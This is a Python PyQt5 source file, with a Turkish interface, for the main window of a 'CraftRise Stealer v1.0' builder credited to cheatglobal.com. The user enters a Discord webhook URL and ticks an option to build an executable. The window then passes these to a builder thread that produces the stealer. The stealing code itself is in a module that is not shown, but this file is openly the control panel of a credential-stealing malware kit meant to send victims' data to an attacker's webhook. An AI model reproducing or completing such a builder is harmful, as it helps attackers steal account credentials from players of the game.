import os
from PyQt5.QtWidgets import (QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
                           QLabel, QLineEdit, QPushButton, QTextEdit,
                           QMessageBox, QProgressBar, QCheckBox, QFrame)
from PyQt5.QtCore import Qt
from PyQt5.QtGui import QIcon

from .styles import Colors, get_stylesheet
from .builder import BuildThread

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.init_ui()
        
    def init_ui(self):
        self.setWindowTitle("CraftRise Stealer v1.0")
        self.setFixedSize(800, 600)
        self.colors = Colors()
        self.setStyleSheet(get_stylesheet(self.colors))
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        layout = QVBoxLayout(central_widget)
        layout.setSpacing(20)
        layout.setContentsMargins(30, 30, 30, 30)
        title_label = QLabel("CraftRise Stealer")
        title_label.setStyleSheet(f"""
            font-size: 28px;
            font-weight: bold;
            color: {self.colors.TEXT};
            margin-bottom: 10px;
        """)
        title_label.setAlignment(Qt.AlignCenter)
        layout.addWidget(title_label)
        webhook_frame = QFrame()
        webhook_layout = QVBoxLayout(webhook_frame)
        webhook_layout.setSpacing(10)
        webhook_layout.setContentsMargins(15, 15, 15, 15)
        webhook_label = QLabel("Discord Webhook URL:")
        webhook_label.setStyleSheet(f"color: {self.colors.TEXT_SECONDARY};")
        self.webhook_input = QLineEdit()
        self.webhook_input.setPlaceholderText("Webhook URL'sini buraya girin...")
        webhook_layout.addWidget(webhook_label)
        webhook_layout.addWidget(self.webhook_input)
        layout.addWidget(webhook_frame)
        options_frame = QFrame()
        options_layout = QVBoxLayout(options_frame)
        options_layout.setSpacing(10)
        options_layout.setContentsMargins(15, 15, 15, 15)
        options_label = QLabel("Build Seçenekleri:")
        options_label.setStyleSheet(f"color: {self.colors.TEXT_SECONDARY};")
        self.exe_checkbox = QCheckBox("Exe olarak build et")
        self.exe_checkbox.setChecked(True)
        options_layout.addWidget(options_label)
        options_layout.addWidget(self.exe_checkbox)
        layout.addWidget(options_frame)
        build_button_container = QHBoxLayout()
        build_button_container.setContentsMargins(50, 0, 50, 0)
        self.build_button = QPushButton("Build")
        self.build_button.setFixedHeight(32)
        self.build_button.clicked.connect(self.build_stealer)
        build_button_container.addWidget(self.build_button)
        layout.addLayout(build_button_container)
        self.progress_bar = QProgressBar()
        self.progress_bar.setVisible(False)
        layout.addWidget(self.progress_bar)
        
        log_frame = QFrame()
        log_layout = QVBoxLayout(log_frame)
        log_layout.setSpacing(10)
        log_layout.setContentsMargins(15, 15, 15, 15)
        
        log_label = QLabel("Build Log:")
        log_label.setStyleSheet(f"color: {self.colors.TEXT_SECONDARY};")
        self.log_area = QTextEdit()
        self.log_area.setReadOnly(True)
        
        log_layout.addWidget(log_label)
        log_layout.addWidget(self.log_area)
        
        layout.addWidget(log_frame)
        
        bottom_info = QLabel("cheatglobal.com | Twixx")
        bottom_info.setStyleSheet(f"""
            color: {self.colors.TEXT_SECONDARY};
            font-size: 13px;
            padding: 10px;
            margin-top: 5px;
        """)
        bottom_info.setAlignment(Qt.AlignCenter)
        layout.addWidget(bottom_info)
        
        self.statusBar().hide()
        
        self.build_thread = None
        
    def log(self, message, color="white"):
        self.log_area.append(f'<span style="color: {color};">{message}</span>')
        
    def build_stealer(self):
        webhook_url = self.webhook_input.text().strip()
        
        if not webhook_url:
            QMessageBox.warning(self, "Hata", "Lütfen bir Discord webhook URL'si girin!")
            return
            
        try:
            self.log("Build işlemi başlatılıyor...", "yellow")
            self.build_button.setEnabled(False)
            self.progress_bar.setVisible(True)
            self.progress_bar.setValue(0)
            
            build_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))), 'build')
            if not os.path.exists(build_dir):
                os.makedirs(build_dir)
            
            self.build_thread = BuildThread(webhook_url, build_dir, self.exe_checkbox.isChecked())
            self.build_thread.progress.connect(lambda msg: self.log(msg, "yellow"))
            self.build_thread.finished.connect(self.on_build_finished)
            self.build_thread.error.connect(lambda msg: self.log(msg, "red"))
            self.build_thread.start()
            
        except Exception as e:
            self.log(f"Build hatası: {str(e)}", "red")
            QMessageBox.critical(self, "Hata", f"Build sırasında bir hata oluştu:\n{str(e)}")
            self.build_button.setEnabled(True)
            self.progress_bar.setVisible(False)
            
    def on_build_finished(self, output_file):
        self.progress_bar.setValue(100)
        self.log(f"Çıktı dosyası: {output_file}", "green")
        self.log("Build işlemi tamamlandı! ✅", "green")
        self.build_button.setEnabled(True)
        self.progress_bar.setVisible(False) 